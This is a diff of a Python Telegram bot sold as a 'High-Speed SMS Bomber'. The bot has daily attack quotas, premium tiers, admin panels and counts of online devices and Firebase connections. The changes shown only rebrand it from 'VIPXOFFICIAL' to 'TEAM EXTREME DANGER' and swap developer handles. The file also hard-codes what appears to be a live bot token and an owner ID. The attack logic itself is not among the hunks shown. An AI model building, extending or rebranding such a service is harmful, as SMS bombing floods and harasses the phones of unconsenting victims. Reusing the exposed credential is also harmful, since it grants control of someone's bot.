@@ -27,8 +27,8 @@ BOT_TOKEN = "8785442680:AAEbpRbVb8ACLYookDQeRrGm8VNaH0Yp-vc"
 BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 ADMIN_IDS = [8935807032]  # Main/Owner Admin IDs
-DEVELOPER_USERNAME = "@VIP_X_OFFICIAL"
-BOT_NAME = "VIPXOFFICIAL_CUSTOM_BOMBER_BOT"
+DEVELOPER_USERNAME = "@VATEROFWHOLETG"
+BOT_NAME = "TEAM EXTREME DANGER_CUSTOM_BOMBER_BOT"
 
 # ==================== SECOND ADMIN CONFIG ====================
 SECOND_ADMIN_FILE = "second_admins.json"
@@ -149,7 +149,7 @@ def load_welcome_image_info():
         with open(WELCOME_IMAGE_FILE, "r") as f:
             return json.load(f)
     except FileNotFoundError:
-        return {"file_id": None, "caption": "🔥 Welcome to VIPXOFFICIAL Bomber!"}
+        return {"file_id": None, "caption": "🔥 Welcome to TEAM EXTREME DANGER Bomber!"}
 
 def save_welcome_image_info(data):
     with open(WELCOME_IMAGE_FILE, "w") as f:
@@ -193,7 +193,7 @@ def get_second_admin_panel_text(user_id):
     gift_codes = load_gift_codes()
     devices = load_device_cache()
     
-    text = f"""👑 VIPXOFFICIAL Admin Panel (Limited)
+    text = f"""👑 TEAM EXTREME DANGER Admin Panel (Limited)
 ==========================
 👥 Total Users: {len(users)}
 🎁 Gift Codes: {len(gift_codes)}
@@ -771,11 +771,11 @@ def get_user_status_text(user_id):
         reset_timer = "Ready"
     online_devices = get_cached_total_devices()
     premium_status = "👑 Premium" if user_data.get("is_premium", False) else "🔰 Normal"
-    return f"""🔥 Welcome to VIPXOFFICIAL Bomber 🔥
+    return f"""🔥 Welcome to TEAM EXTREME DANGER Bomber 🔥
 ==========================
-💣 VIPXOFFICIAL High-Speed SMS Bomber 💣
+💣 TEAM EXTREME DANGER High-Speed SMS Bomber 💣
 ==========================
-👤 User: {user_data.get('username', 'VIP_X_OFFICIAL™')}
+👤 User: {user_data.get('username', 'VATER')}
 🔑 ID: {user_id}
 📌 Status: {premium_status}
 🎰 Daily Attacks: {used}/{daily_limit} used ({remaining} left)
@@ -807,9 +807,9 @@ def get_profile_text(user_id):
     premium_status = "✅ Premium" if user_data.get("is_premium", False) else "❌ Normal"
     expiry = user_data.get("premium_expiry")
     expiry_text = format_ist_datetime(datetime.fromisoformat(expiry)) if expiry else "Not Premium"
-    return f"""📊 VIPXOFFICIAL USER PROFILE
+    return f"""📊 TEAM EXTREME DANGER USER PROFILE
 
-👤 Name: {user_data.get('username', 'VIP_X_OFFICIAL™')}
+👤 Name: {user_data.get('username', 'VATER')}
 🔑 ID: {user_id}
 📌 Status: {'Admin' if user_id in ADMIN_IDS else 'Normal User'}
 👑 Premium: {premium_status}
@@ -927,7 +927,7 @@ def handle_start(chat_id, user_id, message_id=None):
         return
     
     user_data = get_user_data(user_id)
-    username = user_data.get('username') or "VIP_X_OFFICIAL™"
+    username = user_data.get('username') or "VATER"
     user_data["username"] = username
     try:
         resp = requests.get(f"{BASE_URL}/getChat", params={"chat_id": user_id})
@@ -1024,7 +1024,7 @@ def handle_callback(callback_query, chat_id, user_id, message_id):
         online_devices = get_cached_total_devices()
         users = load_user_data()
         settings = load_admin_settings()
-        stats_text = f"""📈 VIPXOFFICIAL STATISTICS
+        stats_text = f"""📈 TEAM EXTREME DANGER STATISTICS
 
 ⚡ Active Devices: {online_devices}
 👥 Total Users: {len(users)}
@@ -1081,7 +1081,7 @@ def handle_callback(callback_query, chat_id, user_id, message_id):
         welcome_info = load_welcome_image_info()
         second_admins = load_second_admins()
         
-        text = f"""👑 VIPXOFFICIAL Owner Admin Panel
+        text = f"""👑 TEAM EXTREME DANGER Owner Admin Panel
 ==========================
 📡 Firebase Connections: {len(configs)}
 ⚡ Online Devices: {len(devices.get('devices', []))}
@@ -1117,7 +1117,7 @@ def handle_callback(callback_query, chat_id, user_id, message_id):
             welcome_info = load_welcome_image_info()
             second_admins = load_second_admins()
             
-            text = f"""👑 VIPXOFFICIAL Owner Admin Panel
+            text = f"""👑 TEAM EXTREME DANGER Owner Admin Panel
 ==========================
 📡 Firebase Connections: {len(configs)}
 ⚡ Online Devices: {len(devices.get('devices', []))}
@@ -1161,7 +1161,7 @@ def handle_callback(callback_query, chat_id, user_id, message_id):
         premium_users = sum(1 for u in users.values() if u.get('is_premium', False))
         second_admins = load_second_admins()
         
-        text = f"""📊 VIPXOFFICIAL Statistics
+        text = f"""📊 TEAM EXTREME DANGER Statistics
 
 📡 Firebase Connections: {len(configs)}
 ⚡ Online Devices: {devices.get('total_online', 0)}
@@ -1635,7 +1635,7 @@ Send the new caption for welcome image.
 Use /setwelcome [text] command.
 
 Example:
-/setwelcome 🔥 Welcome to VIPXOFFICIAL Bomber!""",
+/setwelcome 🔥 Welcome to TEAM EXTREME DANGER Bomber!""",
             reply_markup=keyboard)
         return
 
@@ -1646,7 +1646,7 @@ Example:
         
         welcome_info = load_welcome_image_info()
         welcome_info["file_id"] = None
-        welcome_info["caption"] = "🔥 Welcome to VIPXOFFICIAL Bomber!"
+        welcome_info["caption"] = "🔥 Welcome to TEAM EXTREME DANGER Bomber!"
         save_welcome_image_info(welcome_info)
         answer_callback(cb_id, "✅ Welcome image reset to default!")
         
@@ -2166,7 +2166,7 @@ def handle_message(message):
         welcome_info = load_welcome_image_info()
         welcome_info["file_id"] = file_id
         if not welcome_info.get("caption"):
-            welcome_info["caption"] = "🔥 Welcome to VIPXOFFICIAL Bomber!"
+            welcome_info["caption"] = "🔥 Welcome to TEAM EXTREME DANGER Bomber!"
         save_welcome_image_info(welcome_info)
         keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
         send_message(chat_id, f"✅ Welcome image updated successfully!\n\nCurrent caption: {welcome_info['caption']}", reply_markup=keyboard)
@@ -2277,8 +2277,8 @@ def verify_firebase_connection(url, key):
 def main():
     global last_update_id
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("✅ VIPXOFFICIAL BOT STARTED (RAILWAY READY)!")
-    print("👑 Developer: @VIP_X_OFFICIAL")
+    print("✅ TEAM EXTREME DANGER BOT STARTED (RAILWAY READY)!")
+    print("👑 Developer: @VATEROFWHOLETG")
     print("📡 Connected to", len(load_firebase_configs()), "Firebase(s)")
     cache = load_device_cache()
     devs = cache.get("devices", [])
